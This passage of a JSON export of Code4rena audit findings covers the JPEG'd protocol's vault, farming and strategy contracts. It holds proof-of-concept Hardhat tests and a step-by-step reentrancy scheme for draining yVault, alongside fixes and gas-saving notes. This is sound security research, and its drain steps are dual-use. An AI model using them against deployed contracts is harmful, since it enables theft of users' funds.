      "content": "_Submitted by cmichel, also found by pedroais_\n\n[NFTVault.sol#L212](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L212)<br>\n\nThe `setDebtInterestApr` changes the debt interest rate without first accruing the debt.<br>\nThis means that the new debt interest rate is applied retroactively to the unaccrued period on next `accrue()` call.\n\nIt should never be applied retroactively to a previous time window as this is unfair & wrong.<br>\nBorrowers can incur more debt than they should.\n\n### Recommended Mitigation Steps\n\nCall `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/78#issuecomment-1099241122):**\n > Fixed in [jpegd/core#4](https://github.com/jpegd/core/pull/4).\n\n\n\n***\n\n",
      "summary": "\nA bug was reported in the NFTVault.sol#L212 contract. The bug was that the `setDebtInterestApr` was changing the debt interest rate without accruing the debt first, which meant that the new debt interest rate was applied retroactively to the unaccrued period on the next `accrue()` call. This could be unfair and wrong as borrowers can incur more debt than they should.\n\nThe recommended mitigation step was to call `accrue()` first in `setDebtInterestApr` before setting the new `settings.debtInterestApr`. This bug was confirmed and resolved by spaghettieth (JPEG'd) and the fix was implemented in jpegd/core#4.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/78",
      "tags": [],
      "finders": []
    },
    {
      "id": "22292",
      "title": "[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock",
      "impact": "MEDIUM",
      "content": "_Submitted by TrungOre_\n\n[LPFarming.sol#L214](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L214)<br>\n[LPFarming.sol#L107](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/LPFarming.sol#L107)<br>\n\nA part of reward tokens will be locked in the farming pool if no user deposits lpToken at the epoch.startBlock.\n\n### Proof of Concept\n\n    it(\"a part of reward should be locked in farm if no LP join the pool at epoch.startBlock\", async() => {\n          // manual mine new block  \n          await network.provider.send(\"evm_setAutomine\", [false]);\n\n          // prepare \n          await lpTokens[0].transfer(alice.address, units(1000));\n          await lpTokens[0].connect(alice).approve(farming.address, units(1000));\n          await mineBlocks(1);\n\n          // create new pool\n          await farming.add(10, lpTokens[0].address);\n          await mineBlocks(1);\n          expect(await farming.poolLength()).to.equal(1);\n\n          let pool = await farming.poolInfo(0);\n          expect(pool.lpToken).to.equal(lpTokens[0].address);\n          expect(pool.allocPoint).to.equal(10);\n\n          // create new epoch ==> balance of pool will be 1000 \n          let blockNumber = await ethers.provider.getBlockNumber();\n          await farming.newEpoch(blockNumber + 1, blockNumber + 11, 100);\n\n          // skip the epoch.startBlock  \n          // it mean no one deposit lpToken to farm at this block \n          await mineBlocks(1);\n          expect(await jpeg.balanceOf(farming.address)).to.equal(1000);\n\n          // alice deposit \n          await farming.connect(alice).deposit(0, units(100));\n          await mineBlocks(1);\n\n          // skip the blocks to the end of epoch \n          await mineBlocks(13);\n\n          await farming.connect(alice).claim(0);\n          await mineBlocks(1);\n\n          console.log(\"reward of alice: \", (await jpeg.balanceOf(alice.address)).toString());\n          console.log(\"reward remain: \", await jpeg.balanceOf(farming.address));\n\n          // 100 jpeg will be locked in the pool forevers \n          expect(await jpeg.balanceOf(alice.address)).to.equal(900);\n          expect(await jpeg.balanceOf(farming.address)).to.equal(100);\n        }); \n\nIn the example above, I create an epoch from blockNumber + 1 to blockNumber + 11 with the reward for each block being 100JPEG. So, the total reward for this farm will be 1000JPEG. When I skip the epoch.startBlock and let Alice deposit 100 lpToken at the block right after, at the end of the farm (epoch.endBlock), the total reward of Alice is just 900JPEG, and 100JPEG still remains in the farming pool. Since there is no function for the admin (or users) to withdraw the remaining, 100JPEG will be stucked in the pool forever !!!\n\n### Tools Used\n\ntypescript\n\n### Recommended Mitigation Steps\n\nAdd a new function for the admin (or user) to claim all rewards which remained in the pool when epoch.endTime has passed\n\n    function claimRemainRewardsForOwner() external onlyOwner {\n            require(\n                block.number > epoch.endBlock, \n                'epoch has not ended'\n            );\n            uint256 remain = jpeg.balanceOf(address(this));\n            jpeg.safeTransfer(msg.sender, remain);\n        }\n\n**[spaghettieth (JPEG'd) acknowledged, but disagreed with Medium severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1095301767):**\n > This is a very minor issue, severity should be 0.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/14#issuecomment-1109977048):**\n > I disagree with the sponsor. Funds are lost in this scenario and it is very easy to mitigate.\n\n\n\n***\n\n",
      "summary": "\nA bug has been found in the LPFarming.sol contract, which is part of the JPEG'd project. If no user deposits lpToken at the epoch.startBlock, a part of the reward tokens will be locked in the farming pool. This was demonstrated in a proof of concept written in Typescript. The bug was initially rated as having medium severity, but the sponsor disagreed and rated it as having low severity. The judge disagreed with the sponsor and rated it as having medium severity, as funds are lost in this scenario and it is easy to mitigate.\n\nTo mitigate this bug, a new function should be added to the contract which allows the admin (or user) to claim all rewards which remained in the pool when the epoch.endTime has passed. This function should require that the block number is greater than the epoch.endBlock, and would use the jpeg.safeTransfer() function to transfer the remaining rewards to the admin (or user).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/14",
      "tags": [],
      "finders": []
    },
    {
      "id": "22291",
      "title": "[H-08] `StrategyPUSDConvex.balanceOfJPEG` uses incorrect function signature while calling `extraReward.earned`, causing the function to unexpectedly revert everytime",
      "impact": "HIGH",
      "content": "_Submitted by rayn_\n\n[StrategyPUSDConvex.sol#L234](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234)<br>\n\nAs specified in Convex [BaseRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149) and [VirtualRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127), the function signature of `earned` is `earned(address)`. However, `balanceOfJPEG` did not pass any arguments to `earned`, which would cause `balanceOfJPEG` to always revert.\n\nThis bug will propagate through `Controller` and `YVault` until finally reaching the source of the call in `YVaultLPFarming ._computeUpdate`, and render the entire farming contract unuseable.\n\n### Proof of Concept\n\nBoth `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` takes an address as argument\n\n        function earned(address account) public view returns (uint256) {\n            return\n                balanceOf(account)\n                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                    .div(1e18)\n                    .add(rewards[account]);\n        }\n\n        function earned(address account) public view returns (uint256) {\n            return\n                balanceOf(account)\n                    .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                    .div(1e18)\n                    .add(rewards[account]);\n        }\n\nBut `balanceOfJPEG` does not pass any address to `extraReward.earned`, causing the entire function to revert when called\n\n        function balanceOfJPEG() external view returns (uint256) {\n            uint256 availableBalance = jpeg.balanceOf(address(this));\n\n            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n            uint256 length = baseRewardPool.extraRewardsLength();\n            for (uint256 i = 0; i < length; i++) {\n                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n                if (address(jpeg) == extraReward.rewardToken()) {\n                    availableBalance += extraReward.earned();\n                    //we found jpeg, no need to continue the loop\n                    break;\n                }\n            }\n\n            return availableBalance;\n        }\n\n### Tools Used\n\nvim, ganache-cli\n\n### Recommended Mitigation Steps\n\nPass `address(this)` as argument of `earned`.\n\nNotice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.\n\n        function balanceOfJPEG() external view returns (uint256) {\n            uint256 availableBalance = jpeg.balanceOf(address(this));\n\n            IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n            availableBalance += baseRewardPool.earned(address(this));\n            uint256 length = baseRewardPool.extraRewardsLength();\n            for (uint256 i = 0; i < length; i++) {\n                IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n                if (address(jpeg) == extraReward.rewardToken()) {\n                    availableBalance += extraReward.earned(address(this));\n                }\n            }\n\n            return availableBalance;\n        }\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1099248200):**\n > Fixed in [jpegd/core#15](https://github.com/jpegd/core/pull/15).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/139#issuecomment-1109915863):**\n > Leaving this as high risk. The issue would cause a loss of funds.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a bug in the StrategyPUSDConvex.sol contract which is part of the YVaultLPFarming contract. The bug is caused by the function `balanceOfJPEG` not passing any argument to the function `earned`, which will cause the entire function to revert. This bug will cause the entire farming contract to be unusable. \n\nThe bug is caused by the fact that both `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` take an address as argument, while `balanceOfJPEG` does not pass any address to `extraReward.earned`.\n\nThe recommended mitigation steps are to pass `address(this)` as argument of `earned`. This fix was confirmed and implemented by spaghettieth (JPEG'd) in the jpegd/core#15 pull request. LSDan (judge) left the bug as high risk, as it could cause a loss of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/139",
      "tags": [],
      "finders": []
    },
    {
      "id": "22290",
      "title": "[H-06] Setting new controller can break `YVaultLPFarming`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\n[yVaultLPFarming.sol#L170](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170)<br>\n[yVault.sol#L108](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108)<br>\n\nThe accruals in `yVaultLPFarming` will fail if [`currentBalance < previousBalance`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170) in `_computeUpdate`.\n\n```solidity\ncurrentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));\nuint256 newRewards = currentBalance - previousBalance;\n```\n\nNo funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe `currentBalance < previousBalance` case can, for example, be triggerd by decreasing the `vault.balanceOfJPEG()` due to calling `yVault.setController`:\n\n```solidity\nfunction setController(address _controller) public onlyOwner {\n    // @audit can reduce balanceofJpeg which breaks other masterchef contract\n    require(_controller != address(0), \"INVALID_CONTROLLER\");\n    controller = IController(_controller);\n}\n\nfunction balanceOfJPEG() external view returns (uint256) {\n    // @audit new controller could return a smaller balance\n    return controller.balanceOfJPEG(address(token));\n}\n```\n\n### Recommended Mitigation Steps\n\nSetting a new controller on a vault must be done very carefully and requires a migration.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80#issuecomment-1109891540):**\n > This is not a duplicate of H-05. Though both of them deal with issues related to balanceOfJPEG, they describe different causes.\n\n**[spaghettieth (JPEG'd) acknowledged](https://github.com/code-423n4/2022-04-jpegd-findings/issues/80)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the accruals in yVaultLPFarming failing if `currentBalance < previousBalance` in `_computeUpdate`. This can happen when the `vault.balanceOfJPEG()` is decreased due to calling `yVault.setController`. This means that no funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe recommended mitigation steps are to set a new controller on a vault very carefully and requires a migration. This bug report is not a duplicate of H-05, as both of them deal with issues related to balanceOfJPEG, but describe different causes. This was acknowledged by the JPEG'd team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/80",
      "tags": [],
      "finders": []
    },
    {
      "id": "22289",
      "title": "[H-05] `yVaultLPFarming`: No guarantee JPEG currentBalance > previousBalance",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3_\n\n[yVaultLPFarming.sol#L169-L170](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170)<br>\n\nyVault users participating in the farm have to trust that:\n\n*   `vault.balanceOfJPEG()`  returns the correct claimable JPEG amount by its strategy / strategies\n*   the strategy / strategies will send all claimable JPEG to the farm\n\nShould either of these assumptions break, then it could possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow.\n\n### Proof of Concept\n\nFor instance,\n\n*   Farm migration occurs. A new farm is set in `yVault`, then `withdrawJPEG()` is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.\n\n```jsx\nit.only(\"will revert old farms' deposits and withdrawals if yVault migrates farm\", async () => {\n  // 0. setup\n  await token.mint(owner.address, units(1000));\n  await token.approve(yVault.address, units(1000));\n  await yVault.depositAll();\n  await yVault.approve(lpFarming.address, units(1000));\n  // send some JPEG to strategy prior to deposit\n  await jpeg.mint(strategy.address, units(100));\n  // deposit twice, so that the second deposit will invoke _update()\n  await lpFarming.deposit(units(250));\n  await lpFarming.deposit(units(250));\n\t\n  // 1. change farm and call withdrawJPEG()\n  await yVault.setFarmingPool(user1.address);\n  await yVault.withdrawJPEG();\n\t\n  // deposit and withdrawal will fail\n  await expect(lpFarming.deposit(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n  await expect(lpFarming.withdraw(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n});\n```\n\n*   Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing `vault.balanceOfJPEG()` to report a smaller amount than previously recorded\n*   `jpeg` could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets\n*   A future implementation takes a fee on the `jpeg` to be claimed\n\n### Recommended Mitigation Steps\n\nA simple fix would be to `return` if `currentBalance ≤ previousBalance`. A full fix would properly handle potential shortfall.\n\n```jsx\nif (currentBalance <= previousBalance) return;\n```\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1096865375):**\n > The issue can be reproduced, but due to the extremely specific cases in which this happens the severity should be lowered to 2.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1099243025):**\n > Fixed in [jpegd/core#7](https://github.com/jpegd/core/pull/7).\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/56#issuecomment-1109877532):**\n > I disagree with the sponsor. This is high risk.\n\n\n\n***\n\n",
      "summary": "\nA bug report was submitted by hickuphh3 regarding the yVaultLPFarming.sol#L169-L170 code. The bug occurs when users of the yVault farm have to trust that the `vault.balanceOfJPEG()` returns the correct claimable JPEG amount and that the strategy/strategies will send all claimable JPEG to the farm. If either of these assumptions break, then it could possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow. The bug can be reproduced in specific cases such as farm migration, strategy migration, JPEG funds held by the old strategy not being claimed, `jpeg` being accidentally included in the StrategyConfig, or a future implementation taking a fee on the `jpeg` to be claimed. To fix the bug, a simple fix would be to `return` if `currentBalance ≤ previousBalance`. A full fix would properly handle potential shortfall. The severity of the bug was initially High but was later lowered to 2. The bug was fixed in jpegd/core#7.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/56",
      "tags": [],
      "finders": []
    },
    {
      "id": "22288",
      "title": "[H-04] Reentrancy issue in `yVault.deposit`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\n[yVault.sol#L144-L145](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145)<br>\n\nIn `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.\n\n### Proof of Concept\n\nInitial state: `balance() = 1000`, shares `supply = 1000`.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.\n\n*   Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...\n*   Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...\n*   Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.\n*   Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.\n*   They repeat the attack until the vault is drained.\n\n### Recommended Mitigation Steps\n\nThe `safeTransferFrom` should be the last call in `deposit`.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/81#issuecomment-1099250750):**\n > Fixed in [jpegd/core#19](https://github.com/jpegd/core/pull/19).\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the yVault.sol contract on lines 144-145, which could lead to exploits if the token used is one that gives control to the sender, such as ERC777 tokens. A proof of concept was provided to demonstrate how an attacker could exploit the bug to make a profit. The recommended mitigation step is to make the safeTransferFrom the last call in the deposit function. The bug was confirmed and then resolved and commented on by spaghettieth (JPEG'd). The fix was included in jpegd/core#19.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/81",
      "tags": [],
      "finders": []
    },
    {
      "id": "5344",
      "title": "[G-37] `++i` costs less gas compared to `i++` or `i += 1`",
      "impact": "GAS",
      "content": "\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n\n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n\nBut `++i` returns the actual incremented value:\n\n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\nThis is already done here:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-37-i-costs-less-gas-compared-to-i-or-i--1",
      "tags": [],
      "finders": []
    },
    {
      "id": "5343",
      "title": "[G-35] `>=` is cheaper than `>`",
      "impact": "GAS",
      "content": "\nStrict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas)\n\nI suggest using  `>=`  instead of `>` to avoid some opcodes here:\n\n```solidity\nvaults/NFTVault.sol:539:        return principal > calculatedDebt ? principal : calculatedDebt;\nvaults/NFTVault.sol:775:        _amount = _amount > debtAmount ? debtAmount : _amount;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-35--is-cheaper-than-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5342",
      "title": "[G-34] `> 0` is less efficient than `!= 0` for unsigned integers (with proof)",
      "impact": "GAS",
      "content": "\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\nfarming/LPFarming.sol:114:        require(_rewardPerBlock > 0, \"Invalid reward per block\");\nfarming/LPFarming.sol:218:        require(_amount > 0, \"invalid_amount\");\nfarming/LPFarming.sol:239:        require(_amount > 0, \"invalid_amount\");\nfarming/LPFarming.sol:337:        require(rewards > 0, \"no_reward\");\nfarming/LPFarming.sol:354:        require(rewards > 0, \"no_reward\");\nfarming/yVaultLPFarming.sol:101:        require(_amount > 0, \"invalid_amount\");\nfarming/yVaultLPFarming.sol:118:        require(_amount > 0, \"invalid_amount\");\nfarming/yVaultLPFarming.sol:139:        require(rewards > 0, \"no_reward\");\nlock/JPEGLock.sol:40:        require(_newTime > 0, \"Invalid lock time\");\nstaking/JPEGStaking.sol:32:        require(_amount > 0, \"invalid_amount\");\nvaults/yVault/strategies/StrategyPUSDConvex.sol:182:            _performanceFee.denominator > 0 &&\nvaults/yVault/strategies/StrategyPUSDConvex.sol:334:            require(wethBalance > 0, \"NOOP\");\nvaults/yVault/yVault.sol:100:            _rate.numerator > 0 && _rate.denominator >= _rate.numerator,\nvaults/yVault/yVault.sol:143:        require(_amount > 0, \"INVALID_AMOUNT\");\nvaults/yVault/yVault.sol:167:        require(_shares > 0, \"INVALID_AMOUNT\");\nvaults/yVault/yVault.sol:170:        require(supply > 0, \"NO_TOKENS_DEPOSITED\");\nvaults/FungibleAssetVaultForDAO.sol:94:            _creditLimitRate.denominator > 0 &&\nvaults/FungibleAssetVaultForDAO.sol:108:        require(answer > 0, \"invalid_oracle_answer\");\nvaults/FungibleAssetVaultForDAO.sol:142:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:164:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:180:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:194:        require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\nvaults/NFTVault.sol:278:        require(_newFloor > 0, \"Invalid floor\");\nvaults/NFTVault.sol:327:            _type == bytes32(0) || nftTypeValueETH[_type] > 0,\nvaults/NFTVault.sol:365:        require(pendingValue > 0, \"no_pending_value\");\nvaults/NFTVault.sol:402:            rate.denominator > 0 && rate.denominator >= rate.numerator,\nvaults/NFTVault.sol:462:        require(answer > 0, \"invalid_oracle_answer\");\nvaults/NFTVault.sol:687:        require(_amount > 0, \"invalid_amount\");\nvaults/NFTVault.sol:764:        require(_amount > 0, \"invalid_amount\");\nvaults/NFTVault.sol:770:        require(debtAmount > 0, \"position_not_borrowed\");\nvaults/NFTVault.sol:882:        require(position.liquidatedAt > 0, \"not_liquidated\");\nvaults/NFTVault.sol:926:        require(position.liquidatedAt > 0, \"not_liquidated\");\n```\n\nAlso, please enable the Optimizer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-34--0-is-less-efficient-than--0-for-unsigned-integers-with-proof",
      "tags": [],
      "finders": []
    },
    {
      "id": "5341",
      "title": "[G-31] `yVault.withdrawJPEG()`: `farm` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n187:     function withdrawJPEG() external {\n188:         require(farm != address(0), \"NO_FARM\");  //@audit gas: SLOAD 1 farm\n189:         controller.withdrawJPEG(address(token), farm);  //@audit gas: SLOAD 2 farm\n190:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-31-yvaultwithdrawjpeg-farm-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5340",
      "title": "[G-30] `yVault.withdraw()`: `token` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n166:     function withdraw(uint256 _shares) public noContract(msg.sender) {\n...\n176:         uint256 vaultBalance = token.balanceOf(address(this)); //@audit gas: SLOAD 1 token\n177:         if (vaultBalance < backingTokens) {\n178:             uint256 toWithdraw = backingTokens - vaultBalance;\n179:             controller.withdraw(address(token), toWithdraw);  //@audit gas: SLOAD 2 token\n180:         }\n181: \n182:         token.safeTransfer(msg.sender, backingTokens);  //@audit gas: SLOAD 3 token\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-30-yvaultwithdraw-token-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5339",
      "title": "[G-29] `yVault.withdraw()`: L178 should be unchecked due to L177",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n166:     function withdraw(uint256 _shares) public noContract(msg.sender) {\n...\n177:         if (vaultBalance < backingTokens) {\n178:             uint256 toWithdraw = backingTokens - vaultBalance; //@audit gas: should be unchecked (can't underflow due to L177)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-29-yvaultwithdraw-l178-should-be-unchecked-due-to-l177",
      "tags": [],
      "finders": []
    },
    {
      "id": "5338",
      "title": "[G-28] `yVault.earn()`: `token` and `controller` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n129:     function earn() external {\n130:         uint256 _bal = available();\n131:         token.safeTransfer(address(controller), _bal); //@audit gas: SLOADs 1 token & controller\n132:         controller.earn(address(token), _bal); //@audit gas: SLOADs 2 token & controller\n133:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-28-yvaultearn-token-and-controller-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5337",
      "title": "[G-27] `StrategyPUSDConvex.harvest()`: L362 should be unchecked due to L359-L360 and how performanceFee is set L183",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n177:     function setPerformanceFee(Rate memory _performanceFee)\n...\n181:         require(\n182:             _performanceFee.denominator > 0 &&\n183:                 _performanceFee.denominator >= _performanceFee.numerator, //@audit gas: can uncheck L362 thanks to this\n184:             \"INVALID_RATE\"\n185:         );\n...\n311:     function harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {\n...\n359:         uint256 fee = (usdcBalance * performanceFee.numerator) /\n360:             performanceFee.denominator;\n361:         usdc.safeTransfer(strategy.controller.feeAddress(), fee);\n362:         usdcBalance -= fee; //@audit gas: should be unchecked (can't underflow due to L359-L360 & how performanceFee is set L183)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-27-strategypusdconvexharvest-l362-should-be-unchecked-due-to-l359-l360-and-how-performancefee-is-set-l183",
      "tags": [],
      "finders": []
    },
    {
      "id": "5336",
      "title": "[G-26] `StrategyPUSDConvex.withdraw()`: L281 should be unchecked due to L279",
      "impact": "GAS",
